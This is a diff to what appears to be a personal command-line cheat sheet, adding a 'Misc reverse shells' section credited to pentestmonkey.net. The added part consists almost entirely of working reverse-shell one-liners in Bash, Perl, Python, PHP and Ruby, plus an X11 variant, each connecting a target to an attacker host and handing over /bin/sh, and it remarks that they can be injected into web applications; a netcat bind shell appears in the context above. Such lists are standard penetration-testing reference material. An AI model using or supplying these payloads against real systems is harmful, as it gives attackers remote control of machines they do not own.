@@ -50,6 +50,50 @@ mknod /tmp/datapipe p
 nc -lp PORT -e /bin/sh
 ```
 
+# Misc reverse shells
+
+Most (all) of these require opening a listener with netcat or
+ncat. These are very useful if netcat isn't available or you cannot
+write to a disk on a target computer. Sometimes Python may be
+available on one machine, but Perl is on another. Some of these can be
+modified and injected or included in web applications in certain
+cases. Thanks to pentestmonkey.net for most of these.
+
+- Bash using /dev/tcp
+```
+bash -i >& /dev/tcp/ATTACKER.IP.HERE/PORT 0>&1
+```
+
+- Perl
+```
+perl -e 'use Socket;$i="ATTACKER.IP.HERE";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+- Python
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+- PHP
+```
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+- Ruby
+```
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+```
+
+- X11
+```
+On attacking host, X11 must be accessible by the target machine:
+Xnest :1
+xhost +TARGET.IP.HERE
+
+On target:
+xterm -display ATTACKER.IP.HERE:1
+```
+
 # grep
 - Multiple search terms:
 ```
